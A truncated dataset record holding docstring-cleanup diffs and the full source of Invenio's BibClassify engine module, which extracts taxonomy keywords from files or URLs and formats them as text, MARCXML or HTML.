 as for :see: get_keywords_from_text() \"\"\"\n+    \"\"\"Output keywords reading a local file.\n \n+    Arguments and output are the same as for :see: get_keywords_from_text().\n+    \"\"\"\n     log.info(\"Analyzing keywords for local file %s.\" % local_file)\n     text_lines = extractor.text_lines_from_local_file(local_file)\n \n", "add": 3, "remove": 2, "filename": "/invenio/legacy/bibclassify/engine.py", "badparts": ["    \"\"\"Outputs keywords reading a local file. Arguments and output are the same", "    as for :see: get_keywords_from_text() \"\"\""], "goodparts": ["    \"\"\"Output keywords reading a local file.", "    Arguments and output are the same as for :see: get_keywords_from_text().", "    \"\"\""]}, {"diff": "\n                            with_author_keywords=False, rebuild_cache=False,\n                            only_core_tags=False, extract_acronyms=False,\n                            **kwargs):\n-    \"\"\"Extract keywords from the list of strings\n+    \"\"\"Extract keywords from the list of strings.\n \n     :param text_lines: list of strings (will be normalized before being\n         joined into one string)\n", "add": 1, "remove": 1, "filename": "/invenio/legacy/bibclassify/engine.py", "badparts": ["    \"\"\"Extract keywords from the list of strings"], "goodparts": ["    \"\"\"Extract keywords from the list of strings."]}, {"diff": "\n \n \n def extract_single_keywords(skw_db, fulltext):\n-    \"\"\"Find single keywords in the fulltext\n+    \"\"\"Find single keywords in the fulltext.\n+\n     :var skw_db: list of KeywordToken objects\n     :var fulltext: string, which will be searched\n     :return : dictionary of matches in a format {", "add": 2, "remove": 1, "filename": "/invenio/legacy/bibclassify/engine.py", "badparts": ["    \"\"\"Find single keywords in the fulltext"], "goodparts": ["    \"\"\"Find single keywords in the fulltext."]}], "source": "\n \"\"\" BibClassify engine. This module is the main module of BibClassify. its two main methods are output_keywords_for_sources and get_keywords_from_text. The first one output keywords for a list of sources(local files or URLs, PDF or text) while the second one outputs the keywords for text lines(which are obtained using the module bibclassify_text_normalizer). This module also takes care of the different outputs(text, MARCXML or HTML). But unfortunately there is a confusion between running in a standalone mode and producing output suitable for printing, and running in a web-based mode where the webtemplate is used. For the moment the pieces of the representation code are left in this module. \"\"\" from __future__ import print_function import os from six import iteritems import config as bconfig from invenio.legacy.bibclassify import ontology_reader as reader import text_extractor as extractor import text_normalizer as normalizer import keyword_analyzer as keyworder import acronym_analyzer as acronymer from invenio.utils.url import make_user_agent_string from invenio.utils.text import encode_for_xml log=bconfig.get_logger(\"bibclassify.engine\") def output_keywords_for_sources(input_sources, taxonomy_name, output_mode=\"text\", output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False, match_mode=\"full\", no_cache=False, with_author_keywords=False, rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False, **kwargs): \"\"\"Output the keywords for each source in sources.\"\"\" def process_lines(): if output_mode==\"text\": print(\"Input file: %s\" % source) output=get_keywords_from_text( text_lines, taxonomy_name, output_mode=output_mode, output_limit=output_limit, spires=spires, match_mode=match_mode, no_cache=no_cache, with_author_keywords=with_author_keywords, rebuild_cache=rebuild_cache, only_core_tags=only_core_tags, extract_acronyms=extract_acronyms ) if api: return output else: if isinstance(output, dict): for i in output: print(output[i]) for entry in input_sources: log.info(\"Trying to read input file %s.\" % entry) text_lines=None source=\"\" if os.path.isdir(entry): for filename in os.listdir(entry): if filename.startswith('.'): continue filename=os.path.join(entry, filename) if os.path.isfile(filename): text_lines=extractor.text_lines_from_local_file(filename) if text_lines: source=filename process_lines() elif os.path.isfile(entry): text_lines=extractor.text_lines_from_local_file(entry) if text_lines: source=os.path.basename(entry) process_lines() else: text_lines=extractor.text_lines_from_url(entry, user_agent=make_user_agent_string(\"BibClassify\")) if text_lines: source=entry.split(\"/\")[-1] process_lines() def get_keywords_from_local_file(local_file, taxonomy_name, output_mode=\"text\", output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False, match_mode=\"full\", no_cache=False, with_author_keywords=False, rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False, **kwargs): \"\"\"Outputs keywords reading a local file. Arguments and output are the same as for:see: get_keywords_from_text() \"\"\" log.info(\"Analyzing keywords for local file %s.\" % local_file) text_lines=extractor.text_lines_from_local_file(local_file) return get_keywords_from_text(text_lines, taxonomy_name, output_mode=output_mode, output_limit=output_limit, spires=spires, match_mode=match_mode, no_cache=no_cache, with_author_keywords=with_author_keywords, rebuild_cache=rebuild_cache, only_core_tags=only_core_tags, extract_acronyms=extract_acronyms) def get_keywords_from_text(text_lines, taxonomy_name, output_mode=\"text\", output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False, match_mode=\"full\", no_cache=False, with_author_keywords=False, rebuild_cache=False, only_core_tags=False, extract_acronyms=False, **kwargs): \"\"\"Extract keywords from the list of strings :param text_lines: list of strings(will be normalized before being joined into one string) :param taxonomy_name: string, name of the taxonomy_name :param output_mode: string -text|html|marcxml|raw :param output_limit: int :param spires: boolean, if True marcxml output reflect spires codes. :param match_mode: str -partial|full; in partial mode only beginning of the fulltext is searched. :param no_cache: boolean, means loaded definitions will not be saved. :param with_author_keywords: boolean, extract keywords from the pdfs. :param rebuild_cache: boolean :param only_core_tags: boolean :return: if output_mode=raw, it will return (single_keywords, composite_keywords, author_keywords, acronyms) for other output modes it returns formatted string \"\"\" cache=reader.get_cache(taxonomy_name) if not cache: reader.set_cache(taxonomy_name, reader.get_regular_expressions(taxonomy_name, rebuild=rebuild_cache, no_cache=no_cache)) cache=reader.get_cache(taxonomy_name) _skw=cache[0] _ckw=cache[1] text_lines=normalizer.cut_references(text_lines) fulltext=normalizer.normalize_fulltext(\"\\n\".join(text_lines)) if match_mode==\"partial\": fulltext=_get_partial_text(fulltext) author_keywords=None if with_author_keywords: author_keywords=extract_author_keywords(_skw, _ckw, fulltext) acronyms={} if extract_acronyms: acronyms=extract_abbreviations(fulltext) single_keywords=extract_single_keywords(_skw, fulltext) composite_keywords=extract_composite_keywords(_ckw, fulltext, single_keywords) if only_core_tags: single_keywords=clean_before_output(_filter_core_keywors(single_keywords)) composite_keywords=_filter_core_keywors(composite_keywords) else: single_keywords=clean_before_output(single_keywords) return get_keywords_output(single_keywords, composite_keywords, taxonomy_name, author_keywords, acronyms, output_mode, output_limit, spires, only_core_tags) def extract_single_keywords(skw_db, fulltext): \"\"\"Find single keywords in the fulltext :var skw_db: list of KeywordToken objects :var fulltext: string, which will be searched :return: dictionary of matches in a format{ <keyword object>,[[position, position...],], .. } or empty{} \"\"\" return keyworder.get_single_keywords(skw_db, fulltext) or{} def extract_composite_keywords(ckw_db, fulltext, skw_spans): \"\"\"Returns a list of composite keywords bound with the number of occurrences found in the text string. :var ckw_db: list of KewordToken objects(they are supposed to be composite ones) :var fulltext: string to search in :skw_spans: dictionary of already identified single keywords :return: dictionary of matches in a format{ <keyword object>,[[position, position...],[info_about_matches]], .. } or empty{} \"\"\" return keyworder.get_composite_keywords(ckw_db, fulltext, skw_spans) or{} def extract_abbreviations(fulltext): \"\"\"Extract acronyms from the fulltext :var fulltext: utf-8 string :return: dictionary of matches in a formt{ <keyword object>,[matched skw or ckw object,....] } or empty{} \"\"\" acronyms={} K=reader.KeywordToken for k, v in acronymer.get_acronyms(fulltext).items(): acronyms[K(k, type='acronym')]=v return acronyms def extract_author_keywords(skw_db, ckw_db, fulltext): \"\"\"Finds out human defined keyowrds in a text string. Searches for the string \"Keywords:\" and its declinations and matches the following words. :var skw_db: list single kw object :var ckw_db: list of composite kw objects :var fulltext: utf-8 string :return: dictionary of matches in a formt{ <keyword object>,[matched skw or ckw object,....] } or empty{} \"\"\" akw={} K=reader.KeywordToken for k, v in keyworder.get_author_keywords(skw_db, ckw_db, fulltext).items(): akw[K(k, type='author-kw')]=v return akw def get_keywords_output(single_keywords, composite_keywords, taxonomy_name, author_keywords=None, acronyms=None, style=\"text\", output_limit=0, spires=False, only_core_tags=False): \"\"\"Returns a formatted string representing the keywords according to the chosen style. This is the main routing call, this function will also strip unwanted keywords before output and limits the number of returned keywords :var single_keywords: list of single keywords :var composite_keywords: list of composite keywords :var taxonomy_name: string, taxonomy name :keyword author_keywords: dictionary of author keywords extracted from fulltext :keyword acronyms: dictionary of extracted acronyms :keyword style: text|html|marc :keyword output_limit: int, number of maximum keywords printed(it applies to single and composite keywords separately) :keyword spires: boolen meaning spires output style :keyword only_core_tags: boolean \"\"\" categories={} single_keywords_p=_sort_kw_matches(single_keywords) composite_keywords_p=_sort_kw_matches(composite_keywords) for w in single_keywords_p: categories[w[0].concept]=w[0].type for w in single_keywords_p: categories[w[0].concept]=w[0].type complete_output=_output_complete(single_keywords_p, composite_keywords_p, author_keywords, acronyms, spires, only_core_tags, limit=output_limit) functions={\"text\": _output_text, \"marcxml\": _output_marc, \"html\": _output_html, \"dict\": _output_dict} my_styles={} for s in style: if s !=\"raw\": my_styles[s]=functions[s](complete_output, categories) else: if output_limit > 0: my_styles[\"raw\"]=(_kw(_sort_kw_matches(single_keywords, output_limit)), _kw(_sort_kw_matches(composite_keywords, output_limit)), author_keywords, _kw(_sort_kw_matches(acronyms, output_limit))) else: my_styles[\"raw\"]=(single_keywords_p, composite_keywords_p, author_keywords, acronyms) return my_styles def build_marc(recid, single_keywords, composite_keywords, spires=False, author_keywords=None, acronyms=None): \"\"\"Create xml record. :var recid: ingeter :var single_keywords: dictionary of kws :var composite_keywords: dictionary of kws :keyword spires: please don't use, left for historical reasons :keyword author_keywords: dictionary of extracted keywords :keyword acronyms: dictionary of extracted acronyms :return: str, marxml \"\"\" output=['<collection><record>\\n' '<controlfield tag=\"001\">%s</controlfield>' % recid] single_keywords=single_keywords.items() composite_keywords=composite_keywords.items() output.append(_output_marc(single_keywords, composite_keywords, author_keywords, acronyms)) output.append('</record></collection>') return '\\n'.join(output) def _output_marc(output_complete, categories, kw_field=bconfig.CFG_MAIN_FIELD, auth_field=bconfig.CFG_AUTH_FIELD, acro_field=bconfig.CFG_ACRON_FIELD, provenience='BibClassify'): \"\"\"Output the keywords in the MARCXML format. :var skw_matches: list of single keywords :var ckw_matches: list of composite keywords :var author_keywords: dictionary of extracted author keywords :var acronyms: dictionary of acronyms :var spires: boolean, True=generate spires output -BUT NOTE: it is here only not to break compatibility, in fact spires output should never be used for xml because if we read marc back into the KeywordToken objects, we would not find them :keyword provenience: string that identifies source(authority) that assigned the contents of the field :return: string, formatted MARC\"\"\" kw_template=('<datafield tag=\"%s\" ind1=\"%s\" ind2=\"%s\">\\n' ' <subfield code=\"2\">%s</subfield>\\n' ' <subfield code=\"a\">%s</subfield>\\n' ' <subfield code=\"n\">%s</subfield>\\n' ' <subfield code=\"9\">%s</subfield>\\n' '</datafield>\\n') output=[] tag, ind1, ind2=_parse_marc_code(kw_field) for keywords in(output_complete[\"Single keywords\"], output_complete[\"Core keywords\"]): for kw in keywords: output.append(kw_template %(tag, ind1, ind2, encode_for_xml(provenience), encode_for_xml(kw), keywords[kw], encode_for_xml(categories[kw]))) for field, keywords in((auth_field, output_complete[\"Author keywords\"]), (acro_field, output_complete[\"Acronyms\"])): if keywords and len(keywords) and field: tag, ind1, ind2=_parse_marc_code(field) for kw, info in keywords.items(): output.append(kw_template %(tag, ind1, ind2, encode_for_xml(provenience), encode_for_xml(kw), '', encode_for_xml(categories[kw]))) return \"\".join(output) def _output_complete(skw_matches=None, ckw_matches=None, author_keywords=None, acronyms=None, spires=False, only_core_tags=False, limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER): if limit: resized_skw=skw_matches[0:limit] resized_ckw=ckw_matches[0:limit] else: resized_skw=skw_matches resized_ckw=ckw_matches results={\"Core keywords\": _get_core_keywords(skw_matches, ckw_matches, spires=spires)} if not only_core_tags: results[\"Author keywords\"]=_get_author_keywords(author_keywords, spires=spires) results[\"Composite keywords\"]=_get_compositekws(resized_ckw, spires=spires) results[\"Single keywords\"]=_get_singlekws(resized_skw, spires=spires) results[\"Field codes\"]=_get_fieldcodes(resized_skw, resized_ckw, spires=spires) results[\"Acronyms\"]=_get_acronyms(acronyms) return results def _output_dict(complete_output, categories): return{ \"complete_output\": complete_output, \"categories\": categories } def _output_text(complete_output, categories): \"\"\"Output the results obtained in text format. :return: str, html formatted output \"\"\" output=\"\" for result in complete_output: list_result=complete_output[result] if list_result: list_result_sorted=sorted(list_result, key=lambda x: list_result[x], reverse=True) output +=\"\\n\\n{0}:\\n\".format(result) for element in list_result_sorted: output +=\"\\n{0}{1}\".format(list_result[element], element) output +=\"\\n--\\n{0}\".format(_signature()) return output def _output_html(complete_output, categories): \"\"\"Output the same as txt output does, but HTML formatted. :var skw_matches: sorted list of single keywords :var ckw_matches: sorted list of composite keywords :var author_keywords: dictionary of extracted author keywords :var acronyms: dictionary of acronyms :var spires: boolean :var only_core_tags: boolean :keyword limit: int, number of printed keywords :return: str, html formatted output \"\"\" return \"\"\"<html> <head> <title>Automatically generated keywords by bibclassify</title> </head> <body> {0} </body> </html>\"\"\".format( _output_text(complete_output).replace('\\n', '<br>') ).replace('\\n', '') def _get_singlekws(skw_matches, spires=False): \"\"\" :var skw_matches: dict of{keyword:[info,...]} :keyword spires: bool, to get the spires output :return: list of formatted keywords \"\"\" output={} for single_keyword, info in skw_matches: output[single_keyword.output(spires)]=len(info[0]) return output def _get_compositekws(ckw_matches, spires=False): \"\"\" :var ckw_matches: dict of{keyword:[info,...]} :keyword spires: bool, to get the spires output :return: list of formatted keywords \"\"\" output={} for composite_keyword, info in ckw_matches: output[composite_keyword.output(spires)]={\"numbers\": len(info[0]), \"details\": info[1]} return output def _get_acronyms(acronyms): \"\"\"Return a formatted list of acronyms.\"\"\" acronyms_str={} if acronyms: for acronym, expansions in iteritems(acronyms): expansions_str=\", \".join([\"%s(%d)\" % expansion for expansion in expansions]) acronyms_str[acronym]=expansions_str return acronyms def _get_author_keywords(author_keywords, spires=False): \"\"\"Format the output for the author keywords. :return: list of formatted author keywors \"\"\" out={} if author_keywords: for keyword, matches in author_keywords.items(): skw_matches=matches[0] ckw_matches=matches[1] matches_str=[] for ckw, spans in ckw_matches.items(): matches_str.append(ckw.output(spires)) for skw, spans in skw_matches.items(): matches_str.append(skw.output(spires)) if matches_str: out[keyword]=matches_str else: out[keyword]=0 return out def _get_fieldcodes(skw_matches, ckw_matches, spires=False): \"\"\"Return the output for the field codes. :var skw_matches: dict of{keyword:[info,...]} :var ckw_matches: dict of{keyword:[info,...]} :keyword spires: bool, to get the spires output :return: string\"\"\" fieldcodes={} output={} for skw, _ in skw_matches: for fieldcode in skw.fieldcodes: fieldcodes.setdefault(fieldcode, set()).add(skw.output(spires)) for ckw, _ in ckw_matches: if len(ckw.fieldcodes): for fieldcode in ckw.fieldcodes: fieldcodes.setdefault(fieldcode, set()).add(ckw.output(spires)) else: for kw in ckw.getComponents(): for fieldcode in kw.fieldcodes: fieldcodes.setdefault(fieldcode, set()).add('%s*' % ckw.output(spires)) fieldcodes.setdefault('*', set()).add(kw.output(spires)) for fieldcode, keywords in fieldcodes.items(): output[fieldcode]=', '.join(keywords) return output def _get_core_keywords(skw_matches, ckw_matches, spires=False): \"\"\"Return the output for the field codes. :var skw_matches: dict of{keyword:[info,...]} :var ckw_matches: dict of{keyword:[info,...]} :keyword spires: bool, to get the spires output :return: set of formatted core keywords \"\"\" output={} category={} def _get_value_kw(kw): \"\"\"Help to sort the Core keywords.\"\"\" i=0 while kw[i].isdigit(): i +=1 if i > 0: return int(kw[:i]) else: return 0 for skw, info in skw_matches: if skw.core: output[skw.output(spires)]=len(info[0]) category[skw.output(spires)]=skw.type for ckw, info in ckw_matches: if ckw.core: output[ckw.output(spires)]=len(info[0]) else: i=0 for c in ckw.getComponents(): if c.core: output[c.output(spires)]=info[1][i] i +=1 return output def _filter_core_keywors(keywords): matches={} for kw, info in keywords.items(): if kw.core: matches[kw]=info return matches def _signature(): \"\"\"Print out the bibclassify signature. return 'bibclassify v%s' %(bconfig.VERSION,) def clean_before_output(kw_matches): \"\"\"Return a clean copy of the keywords data structure. Stripped off the standalone and other unwanted elements\"\"\" filtered_kw_matches={} for kw_match, info in iteritems(kw_matches): if not kw_match.nostandalone: filtered_kw_matches[kw_match]=info return filtered_kw_matches def _skw_matches_comparator(kw0, kw1): \"\"\" Compare 2 single keywords objects. First by the number of their spans(ie. how many times they were found), if it is equal it compares them by lenghts of their labels. \"\"\" list_comparison=cmp(len(kw1[1][0]), len(kw0[1][0])) if list_comparison: return list_comparison if kw0[0].isComposite() and kw1[0].isComposite(): component_avg0=sum(kw0[1][1]) / len(kw0[1][1]) component_avg1=sum(kw1[1][1]) / len(kw1[1][1]) component_comparison=cmp(component_avg1, component_avg0) if component_comparison: return component_comparison return cmp(len(str(kw1[0])), len(str(kw0[0]))) def _kw(keywords): \"\"\"Turn list of keywords into dictionary.\"\"\" r={} for k, v in keywords: r[k]=v return r def _sort_kw_matches(skw_matches, limit=0): \"\"\"Return a resized version of keywords to the given length.\"\"\" sorted_keywords=list(skw_matches.items()) sorted_keywords.sort(_skw_matches_comparator) return limit and sorted_keywords[:limit] or sorted_keywords def _get_partial_text(fulltext): \"\"\" Return a short version of the fulltext used with the partial matching mode. The version is composed of 20% in the beginning and 20% in the middle of the text.\"\"\" length=len(fulltext) get_index=lambda x: int(float(x) / 100 * length) partial_text=[fulltext[get_index(start):get_index(end)] for start, end in bconfig.CFG_BIBCLASSIFY_PARTIAL_TEXT] return \"\\n\".join(partial_text) def save_keywords(filename, xml): tmp_dir=os.path.dirname(filename) if not os.path.isdir(tmp_dir): os.mkdir(tmp_dir) file_desc=open(filename, \"w\") file_desc.write(xml) file_desc.close() def get_tmp_file(recid): tmp_directory=\"%s/bibclassify\" % bconfig.CFG_TMPDIR if not os.path.isdir(tmp_directory): os.mkdir(tmp_directory) filename=\"bibclassify_%s.xml\" % recid abs_path=os.path.join(tmp_directory, filename) return abs_path def _parse_marc_code(field): \"\"\"Parse marc field and return default indicators if not filled in.\"\"\" field=str(field) if len(field) < 4: raise Exception('Wrong field code: %s' % field) else: field +='__' tag=field[0:3] ind1=field[3].replace('_', '') ind2=field[4].replace('_', '') return tag, ind1, ind2 if __name__==\"__main__\": log.error(\"Please use bibclassify_cli from now on.\") ", "sourceWithComments": "# -*- coding: utf-8 -*-\n#\n# This file is part of Invenio.\n# Copyright (C) 2007, 2008, 2009, 2010, 2011, 2013, 2014 CERN.\n#\n# Invenio is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License as\n# published by the Free Software Foundation; either version 2 of the\n# License, or (at your option) any later version.\n#\n# Invenio is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Invenio; if not, write to the Free Software Foundation, Inc.,\n# 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.\n\"\"\"\nBibClassify engine.\n\nThis module is the main module of BibClassify. its two main methods are\noutput_keywords_for_sources and get_keywords_from_text. The first one output\nkeywords for a list of sources (local files or URLs, PDF or text) while the\nsecond one outputs the keywords for text lines (which are obtained using the\nmodule bibclassify_text_normalizer).\n\nThis module also takes care of the different outputs (text, MARCXML or HTML).\nBut unfortunately there is a confusion between running in a standalone mode\nand producing output suitable for printing, and running in a web-based\nmode where the webtemplate is used. For the moment the pieces of the representation\ncode are left in this module.\n\"\"\"\n\nfrom __future__ import print_function\n\nimport os\nfrom six import iteritems\nimport config as bconfig\n\nfrom invenio.legacy.bibclassify import ontology_reader as reader\nimport text_extractor as extractor\nimport text_normalizer as normalizer\nimport keyword_analyzer as keyworder\nimport acronym_analyzer as acronymer\n\nfrom invenio.utils.url import make_user_agent_string\nfrom invenio.utils.text import encode_for_xml\n\nlog = bconfig.get_logger(\"bibclassify.engine\")\n\n# ---------------------------------------------------------------------\n#                          API\n# ---------------------------------------------------------------------\n\n\ndef output_keywords_for_sources(input_sources, taxonomy_name, output_mode=\"text\",\n                                output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False,\n                                match_mode=\"full\", no_cache=False, with_author_keywords=False,\n                                rebuild_cache=False, only_core_tags=False, extract_acronyms=False,\n                                api=False, **kwargs):\n    \"\"\"Output the keywords for each source in sources.\"\"\"\n\n    # Inner function which does the job and it would be too much work to\n    # refactor the call (and it must be outside the loop, before it did\n    # not process multiple files)\n    def process_lines():\n        if output_mode == \"text\":\n            print(\"Input file: %s\" % source)\n\n        output = get_keywords_from_text(\n            text_lines,\n            taxonomy_name,\n            output_mode=output_mode,\n            output_limit=output_limit,\n            spires=spires,\n            match_mode=match_mode,\n            no_cache=no_cache,\n            with_author_keywords=with_author_keywords,\n            rebuild_cache=rebuild_cache,\n            only_core_tags=only_core_tags,\n            extract_acronyms=extract_acronyms\n        )\n        if api:\n            return output\n        else:\n            if isinstance(output, dict):\n                for i in output:\n                    print(output[i])\n\n    # Get the fulltext for each source.\n    for entry in input_sources:\n        log.info(\"Trying to read input file %s.\" % entry)\n        text_lines = None\n        source = \"\"\n        if os.path.isdir(entry):\n            for filename in os.listdir(entry):\n                if filename.startswith('.'):\n                    continue\n                filename = os.path.join(entry, filename)\n                if os.path.isfile(filename):\n                    text_lines = extractor.text_lines_from_local_file(filename)\n                    if text_lines:\n                        source = filename\n                        process_lines()\n        elif os.path.isfile(entry):\n            text_lines = extractor.text_lines_from_local_file(entry)\n            if text_lines:\n                source = os.path.basename(entry)\n                process_lines()\n        else:\n            # Treat as a URL.\n            text_lines = extractor.text_lines_from_url(entry,\n                                                       user_agent=make_user_agent_string(\"BibClassify\"))\n            if text_lines:\n                source = entry.split(\"/\")[-1]\n                process_lines()\n\n\ndef get_keywords_from_local_file(local_file, taxonomy_name, output_mode=\"text\",\n                                 output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False,\n                                 match_mode=\"full\", no_cache=False, with_author_keywords=False,\n                                 rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False,\n                                 **kwargs):\n    \"\"\"Outputs keywords reading a local file. Arguments and output are the same\n    as for :see: get_keywords_from_text() \"\"\"\n\n    log.info(\"Analyzing keywords for local file %s.\" % local_file)\n    text_lines = extractor.text_lines_from_local_file(local_file)\n\n    return get_keywords_from_text(text_lines,\n                                  taxonomy_name,\n                                  output_mode=output_mode,\n                                  output_limit=output_limit,\n                                  spires=spires,\n                                  match_mode=match_mode,\n                                  no_cache=no_cache,\n                                  with_author_keywords=with_author_keywords,\n                                  rebuild_cache=rebuild_cache,\n                                  only_core_tags=only_core_tags,\n                                  extract_acronyms=extract_acronyms)\n\n\ndef get_keywords_from_text(text_lines, taxonomy_name, output_mode=\"text\",\n                           output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER,\n                           spires=False, match_mode=\"full\", no_cache=False,\n                           with_author_keywords=False, rebuild_cache=False,\n                           only_core_tags=False, extract_acronyms=False,\n                           **kwargs):\n    \"\"\"Extract keywords from the list of strings\n\n    :param text_lines: list of strings (will be normalized before being\n        joined into one string)\n    :param taxonomy_name: string, name of the taxonomy_name\n    :param output_mode: string - text|html|marcxml|raw\n    :param output_limit: int\n    :param spires: boolean, if True marcxml output reflect spires codes.\n    :param match_mode: str - partial|full; in partial mode only\n        beginning of the fulltext is searched.\n    :param no_cache: boolean, means loaded definitions will not be saved.\n    :param with_author_keywords: boolean, extract keywords from the pdfs.\n    :param rebuild_cache: boolean\n    :param only_core_tags: boolean\n    :return: if output_mode=raw, it will return\n        (single_keywords, composite_keywords, author_keywords, acronyms)\n        for other output modes it returns formatted string\n    \"\"\"\n\n    cache = reader.get_cache(taxonomy_name)\n    if not cache:\n        reader.set_cache(taxonomy_name,\n                         reader.get_regular_expressions(taxonomy_name,\n                                                        rebuild=rebuild_cache,\n                                                        no_cache=no_cache))\n        cache = reader.get_cache(taxonomy_name)\n    _skw = cache[0]\n    _ckw = cache[1]\n    text_lines = normalizer.cut_references(text_lines)\n    fulltext = normalizer.normalize_fulltext(\"\\n\".join(text_lines))\n\n    if match_mode == \"partial\":\n        fulltext = _get_partial_text(fulltext)\n    author_keywords = None\n    if with_author_keywords:\n        author_keywords = extract_author_keywords(_skw, _ckw, fulltext)\n    acronyms = {}\n    if extract_acronyms:\n        acronyms = extract_abbreviations(fulltext)\n\n    single_keywords = extract_single_keywords(_skw, fulltext)\n    composite_keywords = extract_composite_keywords(_ckw, fulltext, single_keywords)\n\n    if only_core_tags:\n        single_keywords = clean_before_output(_filter_core_keywors(single_keywords))\n        composite_keywords = _filter_core_keywors(composite_keywords)\n    else:\n        # Filter out the \"nonstandalone\" keywords\n        single_keywords = clean_before_output(single_keywords)\n    return get_keywords_output(single_keywords, composite_keywords, taxonomy_name,\n                               author_keywords, acronyms, output_mode, output_limit,\n                               spires, only_core_tags)\n\n\ndef extract_single_keywords(skw_db, fulltext):\n    \"\"\"Find single keywords in the fulltext\n    :var skw_db: list of KeywordToken objects\n    :var fulltext: string, which will be searched\n    :return : dictionary of matches in a format {\n            <keyword object>, [[position, position...], ],\n            ..\n            }\n            or empty {}\n    \"\"\"\n    return keyworder.get_single_keywords(skw_db, fulltext) or {}\n\n\ndef extract_composite_keywords(ckw_db, fulltext, skw_spans):\n    \"\"\"Returns a list of composite keywords bound with the number of\n    occurrences found in the text string.\n    :var ckw_db: list of KewordToken objects (they are supposed to be composite ones)\n    :var fulltext: string to search in\n    :skw_spans: dictionary of already identified single keywords\n    :return : dictionary of matches in a format {\n            <keyword object>, [[position, position...], [info_about_matches] ],\n            ..\n            }\n            or empty {}\n    \"\"\"\n    return keyworder.get_composite_keywords(ckw_db, fulltext, skw_spans) or {}\n\n\ndef extract_abbreviations(fulltext):\n    \"\"\"Extract acronyms from the fulltext\n    :var fulltext: utf-8 string\n    :return: dictionary of matches in a formt {\n          <keyword object>, [matched skw or ckw object, ....]\n          }\n          or empty {}\n    \"\"\"\n    acronyms = {}\n    K = reader.KeywordToken\n    for k, v in acronymer.get_acronyms(fulltext).items():\n        acronyms[K(k, type='acronym')] = v\n    return acronyms\n\n\ndef extract_author_keywords(skw_db, ckw_db, fulltext):\n    \"\"\"Finds out human defined keyowrds in a text string. Searches for\n    the string \"Keywords:\" and its declinations and matches the\n    following words.\n\n    :var skw_db: list single kw object\n    :var ckw_db: list of composite kw objects\n    :var fulltext: utf-8 string\n    :return: dictionary of matches in a formt {\n          <keyword object>, [matched skw or ckw object, ....]\n          }\n          or empty {}\n    \"\"\"\n    akw = {}\n    K = reader.KeywordToken\n    for k, v in keyworder.get_author_keywords(skw_db, ckw_db, fulltext).items():\n        akw[K(k, type='author-kw')] = v\n    return akw\n\n\n# ---------------------------------------------------------------------\n#                          presentation functions\n# ---------------------------------------------------------------------\n\n\ndef get_keywords_output(single_keywords, composite_keywords, taxonomy_name,\n                        author_keywords=None, acronyms=None, style=\"text\", output_limit=0,\n                        spires=False, only_core_tags=False):\n    \"\"\"Returns a formatted string representing the keywords according\n    to the chosen style. This is the main routing call, this function will\n    also strip unwanted keywords before output and limits the number\n    of returned keywords\n    :var single_keywords: list of single keywords\n    :var composite_keywords: list of composite keywords\n    :var taxonomy_name: string, taxonomy name\n    :keyword author_keywords: dictionary of author keywords extracted from fulltext\n    :keyword acronyms: dictionary of extracted acronyms\n    :keyword style: text|html|marc\n    :keyword output_limit: int, number of maximum keywords printed (it applies\n            to single and composite keywords separately)\n    :keyword spires: boolen meaning spires output style\n    :keyword only_core_tags: boolean\n    \"\"\"\n    categories = {}\n    # sort the keywords, but don't limit them (that will be done later)\n    single_keywords_p = _sort_kw_matches(single_keywords)\n\n    composite_keywords_p = _sort_kw_matches(composite_keywords)\n\n    for w in single_keywords_p:\n        categories[w[0].concept] = w[0].type\n    for w in single_keywords_p:\n        categories[w[0].concept] = w[0].type\n\n    complete_output = _output_complete(single_keywords_p, composite_keywords_p,\n                                       author_keywords, acronyms, spires,\n                                       only_core_tags, limit=output_limit)\n    functions = {\"text\": _output_text, \"marcxml\": _output_marc, \"html\":\n                 _output_html, \"dict\": _output_dict}\n    my_styles = {}\n\n    for s in style:\n        if s != \"raw\":\n            my_styles[s] = functions[s](complete_output, categories)\n        else:\n            if output_limit > 0:\n                my_styles[\"raw\"] = (_kw(_sort_kw_matches(single_keywords, output_limit)),\n                                    _kw(_sort_kw_matches(composite_keywords, output_limit)),\n                                    author_keywords,  # this we don't limit (?)\n                                    _kw(_sort_kw_matches(acronyms, output_limit)))\n            else:\n                my_styles[\"raw\"] = (single_keywords_p, composite_keywords_p, author_keywords, acronyms)\n\n    return my_styles\n\n\ndef build_marc(recid, single_keywords, composite_keywords,\n               spires=False, author_keywords=None, acronyms=None):\n    \"\"\"Create xml record.\n\n    :var recid: ingeter\n    :var single_keywords: dictionary of kws\n    :var composite_keywords: dictionary of kws\n    :keyword spires: please don't use, left for historical\n        reasons\n    :keyword author_keywords: dictionary of extracted keywords\n    :keyword acronyms: dictionary of extracted acronyms\n    :return: str, marxml\n    \"\"\"\n    output = ['<collection><record>\\n'\n              '<controlfield tag=\"001\">%s</controlfield>' % recid]\n\n    # no need to sort\n    single_keywords = single_keywords.items()\n    composite_keywords = composite_keywords.items()\n\n    output.append(_output_marc(single_keywords, composite_keywords, author_keywords, acronyms))\n\n    output.append('</record></collection>')\n\n    return '\\n'.join(output)\n\n\ndef _output_marc(output_complete, categories, kw_field=bconfig.CFG_MAIN_FIELD,\n                 auth_field=bconfig.CFG_AUTH_FIELD, acro_field=bconfig.CFG_ACRON_FIELD,\n                 provenience='BibClassify'):\n    \"\"\"Output the keywords in the MARCXML format.\n\n    :var skw_matches: list of single keywords\n    :var ckw_matches: list of composite keywords\n    :var author_keywords: dictionary of extracted author keywords\n    :var acronyms: dictionary of acronyms\n    